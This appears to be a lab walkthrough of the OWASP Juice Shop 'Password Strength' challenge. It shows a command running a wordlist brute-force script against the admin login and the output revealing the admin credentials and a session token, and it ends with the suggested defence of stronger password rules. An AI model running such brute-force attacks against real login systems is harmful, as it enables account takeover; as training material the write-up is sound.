# Password Strength
Log in with the administrator's user credentials without previously changing them or applying SQL Injection.

Style: Brute-Force, Tutorial, With Coding Challenge
Topic: Broken Authentication

## Solution

### Web Challenge

Acording to all the tips we just should do a brute-force attack. it quite interesting so we won't use the pre-built tools inside `caido` and `burp`.

A simple python script, used claude for building the script. told him to support async for speed and loguru, seemed to work quite fast

```bash
uv run "Walkthrough/2-Star/Password Strength/admin_bruteforce.py" --wordlist /Users/talnir01/Projects/tools/rockyou.txt/rockyou.txt --log-level DEBUG
```

```bash
# Result
15:04:56 | SUCCESS  | HIT! password='admin123' (status 200)
15:04:56 | INFO     | response body: {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDYtMDYgMDk6MzE6MjkuNjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjI
```

So we concluded that the creds are:
* Username (email): `admin@juice-sh.op`
* Password: `admin123`

### Coding Challenge

So they offer to put solution in adding restrication for the base password requirement, like minimum of 10 characters and also valided that it's not in the Top-1-Million most commonly used passwords...